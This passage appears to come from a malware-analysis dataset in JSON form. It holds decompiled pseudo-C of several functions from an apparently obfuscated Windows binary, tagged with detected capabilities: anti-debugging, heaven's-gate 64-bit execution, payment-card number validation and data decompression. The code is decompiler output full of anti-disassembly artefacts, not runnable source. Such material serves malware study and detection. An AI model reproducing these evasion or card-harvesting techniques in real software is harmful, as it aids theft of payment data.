        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b79) overlaps instruction at (ram,0x00402b76)\n// \n// WARNING: Removing unreachable block (ram,0x00402b6a)\n// WARNING: Removing unreachable block (ram,0x00402b72)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402a60(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort extraout_DX;\n    ushort uVar4;\n    int32_t iVar5;\n    code *unaff_ESI;\n    uint *puVar6;\n    char in_AF;\n    bool bVar7;\n    uchar uVar8;\n    unkbyte6 Var9;\n    uint var_25fh;\n    uchar var_15ch;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403690();\n    iVar3 = fcn.00402260();\n    if (iVar3 != 0) {\n        iVar5 = 0;\n        puVar6 = &var_25fh;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        bVar7 = iVar3 == 0;\n        if (!bVar7) {\n            if ((!bVar7) && (bVar7)) {\n                iVar5 = 1;\n                piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n                *piVar1 = *piVar1 + -1;\n                unaff_ESI = unaff_ESI + 1;\n            }\n            fcn.004018a0();\n            var_15ch = iVar5;\n            puVar6 = &var_15bh;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            var_14h = iVar5;\n            while( true ) {\n                puVar6 = &var_58h;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                var_10h = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                var_8h = 0;\n                var_28h._0_2_ = iVar5;\n                var_4h = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                if (iVar3 == 0) break;\n                (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00402940, var_8h);\n                Var9 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(var_10h, 1000);\n                uVar4 = Var9 >> 0x20;\n                uVar8 = Var9 == 0x102;\n                if (uVar8) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(var_10h, 1);\n                    uVar4 = extraout_DX;\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar8) && (uVar8)) {\n                    out(*unaff_ESI, uVar4);\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar2)(var_10h);\n                var_14h = var_14h + 1;\n                if (0 < var_14h) {\n                    return;\n                }\n                iVar5 = 0;\n                unaff_ESI = pcVar2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1027
    },
    "00404620": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404620(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004018a0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004045e0();\n        arg_ch_01 = fcn.004045e0();\n        arg_ch_02 = fcn.004045e0();\n        fcn.00401000(arg_10h, arg_ch_00);\n        fcn.00401000(arg_8h, arg_ch_01);\n        fcn.00401000(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411378, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403940(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411384, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403940(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411384, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403940(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401000(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 609
    },
    "00402d10": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040324d) overlaps instruction at (ram,0x0040324a)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.00402d10(uint32_t *param_1)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    ushort uVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    char cVar7;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    ushort extraout_CX_01;\n    char extraout_CH_00;\n    uint16_t extraout_CX_02;\n    uchar *extraout_ECX;\n    char extraout_CH;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint8_t uVar8;\n    int32_t extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    char extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    uint extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    uint extraout_EDX_05;\n    uint32_t unaff_EBX;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uint32_t *puVar18;\n    uint16_t *puVar19;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint16_t uVar20;\n    uint *unaff_EDI;\n    uint8_t *puVar21;\n    uint8_t *puVar22;\n    ushort in_CS;\n    ushort in_SS;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    bool bVar23;\n    bool bVar24;\n    char cVar25;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool in_OF;\n    char cVar26;\n    bool bVar27;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar28;\n    uint arg_ch;\n    uint in_stack_ffffa159;\n    uint arg_10h;\n    uint arg_14h;\n    uint uVar29;\n    uint in_stack_ffffffec;\n    \n    if ((in_OF) || (!in_OF)) {\n        param_1 = 0xa;\n        in_stack_ffffffec = 0x411378;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        uVar9 = in_CF;\n        uVar3 = in_EAX + 1U + *param_1;\n        in_CF = CARRY4(in_EAX + 1U, *param_1) || CARRY4(uVar3, uVar9);\n        in_ZF = uVar3 + uVar9 == 0;\n        unaff_ESI = unaff_ESI + 1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    fcn.004015f0(0x407014, 0x10, in_stack_ffffffec, param_1);\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.004015f0(0x407014, 0x10, 0x411384, 0x12);\n    fcn.004015f0(0x407014, 0x10, 0x411398, 4);\n    uVar9 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    cVar26 = SBORROW4(uVar9, 0x222c);\n    cVar25 = uVar9 - 0x222c < 0;\n    bVar23 = uVar9 == 0x222c;\n    uVar29 = 0x402daf;\n    fcn.004015f0(0x407014, 0x10, 0x41139c, 0xc);\n    if ((bVar23 || cVar26 != cVar25) || (!bVar23 && cVar26 == cVar25)) {\n        uVar29 = 7;\n    }\n    puVar10 = &stack0xffffffe0;\n    fcn.004015f0(0x407014, 0x10, 0x4113a8, uVar29);\n    fcn.004015f0(0x407014, 0x10, 0x4113b0, 0xb);\n    fcn.004015f0(0x407014, 0x10, 0x4113bc, 0xc);\n    bVar23 = extraout_DX + (extraout_DX >> 8) == '\\0';\n    fcn.004015f0(0x407014, 0x10, 0x4113c8, 8);\n    if ((!bVar23) && (bVar23)) {\n        cVar25 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *unaff_EBP;\n            cVar25 = cVar25 + -1;\n        } while ('\\0' < cVar25);\n    }\n    fcn.004015f0(0x407014, 0x10, 0x4113d0, 0xd);\n    uVar29 = 0x402e96;\n    fcn.004015f0(0x407014, 0x10, 0x4113e0, 0x18);\n    bVar23 = false;\n    bVar27 = false;\n    bVar24 = (unaff_EBX & 0x4d) == 0;\n    arg_14h = 0x10;\n    arg_10h = 0x407014;\n    fcn.004015f0(0x407014, 0x10, 0x4113f8, 0x25);\n    if ((bVar27) || (!bVar27)) {\ncode_r0x00402eca:\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, unaff_EBX);\n        pcVar1 = extraout_EDX + 0x10;\n        *pcVar1 = *pcVar1 + (extraout_ECX >> 8);\n        bVar23 = *pcVar1 < '\\0';\n        arg_ch = 0x407014;\n        fcn.004015f0(0x407014, 0x56, arg_10h, arg_14h);\n        if ((bVar23) || (!bVar23)) {\n            arg_ch = 0x10;\n        }\n        *(extraout_EDX_00 + 0x10) = *(extraout_EDX_00 + 0x10) + extraout_CH;\n        fcn.004015f0(0x407014, arg_ch, in_stack_ffffa159, uVar29);\n        fcn.004015f0(0x407014, 0x10, 0x411438, 0xd);\n        iVar6 = extraout_EDX_01;\n    }\n    else {\n        puVar10 = unaff_EDI + 1;\n        uVar2 = in(extraout_EDX);\n        *unaff_EDI = uVar2;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        iVar6 = extraout_EDX;\n        unaff_EDI = puVar10;\n        if (bVar23 || bVar24) goto code_r0x00402eca;\n    }\n    cVar26 = SBORROW1(iVar6, 'Q');\n    cVar25 = iVar6 + -0x51 < '\\0';\n    uVar5 = fcn.004015f0(0x407014, 0x10, 0x411448, 6);\n    if ((cVar26 != cVar25) || (cVar7 = (extraout_ECX_00 << 0x10) >> 0x18,  cVar26 == cVar25)) {\n        cVar7 = extraout_ECX_00 >> 8;\n    }\n    puVar11 = &stack0xffffa165 ^ *(unaff_EBX + 0x6a);\n    *(extraout_EDX_02 + 0x10) = *(extraout_EDX_02 + 0x10) + cVar7;\n    puVar11[-1] = 0x407014;\n    puVar11[-2] = 0x402f90;\n    fcn.004015f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    puVar11[6] = extraout_EDX_03;\n    *(puVar11 + 0x16) = extraout_CX;\n    *(puVar11 + 5) = unaff_EDI;\n    cVar26 = '\\x01';\n    cVar25 = '\\x01';\n    bVar23 = false;\n    uVar20 = *(puVar11 + 5);\n    puVar11[6] = 0xd;\n    puVar11[5] = 0x411458;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x402fcc;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    if (!bVar23 && cVar26 == cVar25) {\n        *(puVar11 + 10) = uVar5;\n    }\n    puVar11[2] = 0x19;\n    puVar11[1] = 0x411468;\n    *puVar11 = 0x10;\n    puVar11[-1] = 0x407014;\n    puVar11[-2] = 0x402fef;\n    fcn.004015f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    puVar11[6] = unaff_EDI & 0xffff0000 | uVar20;\n    bVar23 = (uVar20 | 0x2fff) - unaff_EBX == 0x7174;\n    puVar11[6] = 0xf;\n    puVar11[5] = 0x411484;\n    puVar11[4] = 0x10;\n    puVar12 = puVar11 + 3;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x403028;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    if ((bVar23) || (*(puVar11 + 10) = extraout_CX_00,  !bVar23)) {\n        puVar12 = puVar11 + 2;\n        puVar11[2] = 0xe;\n    }\n    *(puVar12 + -1) = in_SS;\n    uVar29 = puVar12[-1];\n    puVar12[-1] = 0x47;\n    puVar12[-2] = 0x411494;\n    puVar12[-3] = 0x10;\n    puVar12[-4] = 0x407014;\n    puVar12[-5] = 0x40304c;\n    uVar28 = fcn.004015f0(puVar12[-4], puVar12[-3], puVar12[-2], puVar12[-1]);\n    puVar12[3] = uVar28;\n    puVar12[2] = uVar28 >> 0x20;\n    puVar12[1] = uVar29;\n    bVar23 = CARRY1(uVar28 >> 0x20, uVar28 >> 0x28);\n    puVar21 = puVar12[1];\n    puVar12[3] = 0xb;\n    puVar12[2] = 0x4114a4;\n    puVar12[1] = 0x10;\n    *puVar12 = 0x407014;\n    puVar12[-1] = 0x40306a;\n    uVar4 = fcn.004015f0(*puVar12, puVar12[1], puVar12[2], puVar12[3]);\n    if (bVar23) {\ncode_r0x00403082:\n        puVar14 = puVar12 + -1;\n        puVar12 = puVar12 + -1;\n        *puVar14 = 0xb;\n    }\n    else {\n        *(puVar12 + -2) = puVar21;\n        puVar21 = puVar21 & 0xffff0000 | *(puVar12 + -2);\n        if (!bVar23) goto code_r0x00403082;\n    }\n    puVar22 = puVar21 + 1;\n    cVar25 = uVar4 - *puVar21;\n    *(puVar12 + -4) =\n         (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *puVar21) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n         (cVar25 < '\\0') * 0x80 | (cVar25 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar25) & 1U) == 0) * 4 |\n         uVar4 < *puVar21 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n         (in_AC & 1) * 0x40000;\n    puVar13 = puVar12 + -8;\n    *(puVar12 + -8) = 0x40307c;\n    func_0x10188ff4();\n    puVar10 = extraout_EDX_04 + 0xb;\n    puVar13[-1] = 0x4114b0;\n    puVar13[-2] = 0x10;\n    puVar13[-3] = 0x407014;\n    puVar13[-4] = 0x403095;\n    uVar29 = fcn.004015f0(puVar13[-3], puVar13[-2], puVar13[-1], *puVar13);\n    puVar13[4] = uVar29;\n    puVar13[3] = extraout_ECX_01;\n    puVar13[4] = 0xb;\n    puVar13[3] = 0x4114bc;\n    puVar13[2] = 0x10;\n    puVar13[1] = 0x407014;\n    *puVar13 = 0x4030c0;\n    fcn.004015f0(puVar13[1], puVar13[2], puVar13[3], puVar13[4]);\n    puVar13[4] = unaff_EBX;\n    *(puVar13 + 0xe) = extraout_CX_01;\n    bVar23 = false;\n    uVar29 = puVar13[4];\n    puVar13[4] = 10;\n    puVar13[3] = 0x4114c8;\n    puVar13[2] = 0x10;\n    puVar13[1] = 0x407014;\n    *puVar13 = 0x4030eb;\n    fcn.004015f0(puVar13[1], puVar13[2], puVar13[3], puVar13[4]);\n    if ((bVar23) || (puVar16 = puVar13 + 1,  !bVar23)) {\n        *puVar13 = 0xc;\n        puVar16 = puVar13;\n    }\n    cVar26 = '\\0';\n    cVar25 = (extraout_ECX_02 & *(extraout_ECX_02 + 0x87cb1757)) < 0;\n    puVar16[-1] = 0x4114d4;\n    puVar16[-2] = 0x10;\n    puVar15 = puVar16 + -3;\n    puVar16[-3] = 0x407014;\n    puVar16[-4] = 0x403115;\n    iVar6 = fcn.004015f0(puVar16[-3], puVar16[-2], puVar16[-1], *puVar16);\n    if (cVar26 == cVar25) {\n        puVar16[-4] = uVar29;\n        uVar29 = puVar16[-4];\n        if (cVar26 == cVar25) goto code_r0x00403120;\n    }\n    else {\ncode_r0x00403120:\n        puVar16[-4] = 0xe;\n        puVar16[-5] = 0x4114e0;\n        puVar15 = puVar16 + -6;\n        puVar16[-6] = 0x10;\n    }\n    pcVar1 = iVar6 + 0x10;\n    *pcVar1 = *pcVar1 + extraout_CH_00;\n    bVar23 = *pcVar1 == '\\0';\n    puVar15[-1] = 0x407014;\n    puVar15[-2] = 0x403133;\n    fcn.004015f0(puVar15[-1], *puVar15, puVar15[1], puVar15[2]);\n    puVar16 = puVar15 + -1;\n    if ((!bVar23) && (puVar16 = puVar15 + -1,  bVar23)) {\n        puVar16 = puVar15 + -2;\n        puVar15[-2] = puVar10;\n        cVar25 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *puVar10;\n            cVar25 = cVar25 + -1;\n        } while ('\\0' < cVar25);\n        puVar15[-0x13] = puVar15 + -2;\n        puVar16 = puVar15 + -0x5e67;\n    }\n    *(puVar16 + -4) = 0x11;\n    *(puVar16 + -8) = 0x4114f0;\n    *(puVar16 + -0xc) = 0x10;\n    *(puVar16 + -0x10) = 0x407014;\n    *(puVar16 + -0x14) = 0x403155;\n    fcn.004015f0(*(puVar16 + -0x10), *(puVar16 + -0xc), *(puVar16 + -8), *(puVar16 + -4));\n    *(puVar16 + 0x2c) = uVar29;\n    bVar23 = (POPCOUNT(uVar29 & extraout_CX_02 & 0xff) & 1U) == 0;\n    uVar29 = *(puVar16 + 0x2c);\n    *(puVar16 + 0x2c) = 0x13;\n    *(puVar16 + 0x28) = 0x411504;\n    *(puVar16 + 0x24) = 0x10;\n    puVar17 = puVar16 + 0x20;\n    *(puVar16 + 0x20) = 0x407014;\n    *(puVar16 + 0x1c) = 0x403170;\n    cVar25 = fcn.004015f0(*(puVar16 + 0x20), *(puVar16 + 0x24), *(puVar16 + 0x28), *(puVar16 + 0x2c));\n    if (!bVar23) {\n        *(puVar16 + 0x1c) = puVar22;\n        puVar22 = *(puVar16 + 0x1c);\n        if (bVar23) goto code_r0x0040317a;\n    }\n    *(puVar16 + 0x1c) = 0x14;\n    *(puVar16 + 0x18) = 0x411518;\n    puVar17 = puVar16 + 0x14;\n    *(puVar16 + 0x14) = 0x10;\ncode_r0x0040317a:\n    uVar20 = 0x6cf4;\n    *0x106a0041 = (*0x106a0041 - cVar25) - (0x97 < extraout_DL + 1U);\n    puVar17[-1] = 0x407014;\n    puVar17[-2] = 0x40319a;\n    fcn.004015f0(puVar17[-1], *puVar17, puVar17[1], puVar17[2]);\n    puVar17[6] = uVar29;\n    uVar29 = puVar17[6];\n    puVar17[6] = 0x33;\n    puVar17[5] = 0x41152c;\n    puVar17[4] = 0x10;\n    puVar17[3] = 0x407014;\n    puVar17[2] = 0x4031c5;\n    fcn.004015f0(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    puVar17[6] = uVar29;\n    uVar9 = puVar17[6];\n    puVar17[6] = 10;\n    puVar17[5] = 0x411560;\n    puVar17[4] = 0x10;\n    puVar17[3] = 0x407014;\n    puVar17[2] = 0x4031f0;\n    uVar28 = fcn.004015f0(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    puVar17[6] = uVar28;\n    puVar17[5] = uVar28 >> 0x20;\n    puVar17[4] = puVar22;\n    uVar29 = puVar17[4];\n    puVar17[6] = 4;\n    puVar17[5] = 0x41156c;\n    puVar17[4] = 0x10;\n    puVar17[3] = 0x407014;\n    puVar17[2] = 0x40320e;\n    fcn.004015f0(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    puVar17[2] = 5;\n    puVar17[1] = 0x411570;\n    *puVar17 = 0x10;\n    puVar17[-1] = 0x407014;\n    puVar17[-2] = 0x40322f;\n    fcn.004015f0(puVar17[-1], *puVar17, puVar17[1], puVar17[2]);\n    puVar17[6] = extraout_EDX_05;\n    *(puVar17 + 0x16) = uVar9;\n    uVar5 = *(puVar17 + 0x16);\n    uVar9 = uVar9 & 0xffff0000;\n    puVar17[6] = 6;\n    puVar17[5] = 0x411578;\n    puVar17[4] = 0x10;\n    puVar17[3] = 0x407014;\n    puVar17[2] = 0x403254;\n    fcn.004015f0(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    puVar19 = puVar17 + 0x1a;\n    *(puVar17 + 0x1a) = uVar5;\n    iVar6 = extraout_ECX_03;\n    while( true ) {\n        puVar19[-1] = uVar20;\n        *(puVar19 + -3) = uVar29;\n        bVar23 = false;\n        bVar27 = false;\n        bVar24 = (uVar20 & iVar6) == 0;\n        uVar29 = *(puVar19 + -3);\n        uVar5 = puVar19[-1];\n        uVar9 = uVar9 & 0xffff0000 | *puVar19;\n        *(puVar19 + -1) = 0x2a;\n        *(puVar19 + -3) = 0x4115ac;\n        *(puVar19 + -5) = 0x10;\n        *(puVar19 + -7) = 0x407014;\n        *(puVar19 + -9) = 0x40327d;\n        cVar25 = fcn.004015f0(*(puVar19 + -7), *(puVar19 + -5), *(puVar19 + -3), *(puVar19 + -1));\n        if (bVar23 || bVar24) break;\n        puVar19[-8] = uVar5;\n        uVar20 = puVar19[-8];\n        if (!bVar23 && !bVar24) break;\n        if (!bVar27) {\n            puVar19[-9] = in_CS;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar4 = cVar25 + 1;\n        uVar8 = extraout_ECX_04 >> 8;\n        cVar25 = uVar4 + uVar8;\n        puVar18 = puVar19 + -9;\n        puVar19 = puVar19 + -9;\n        *puVar18 = (in_NT & 1) * 0x4000 | SCARRY1(uVar4, uVar8) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                   (cVar25 < '\\0') * 0x80 | (cVar25 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                   ((POPCOUNT(cVar25) & 1U) == 0) * 4 | CARRY1(uVar4, uVar8) | (in_ID & 1) * 0x200000 |\n                   (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        if (extraout_ECX_04 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(uVar9 + 0x536610c4) = *(uVar9 + 0x536610c4) + 1;\n        iVar6 = extraout_ECX_04;\n    }\n    *(puVar19 + -9) = 0xb;\n    *(puVar19 + -0xb) = 0x4115d8;\n    *(puVar19 + -0xd) = 0x10;\n    *(puVar19 + -0xf) = 0x407014;\n    *(puVar19 + -0x11) = 0x4032b2;\n    fcn.004015f0(*(puVar19 + -0xf), *(puVar19 + -0xd), *(puVar19 + -0xb), *(puVar19 + -9));\n    return;\n}\n",
        "token_count": 6397
    },
    "00403dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403dc0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401f80;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00403e80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403e80(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x424820 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401000(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411638, acStack1304, &uStack2112);\n    uStack2088 = 0x4116c0;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4116d8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 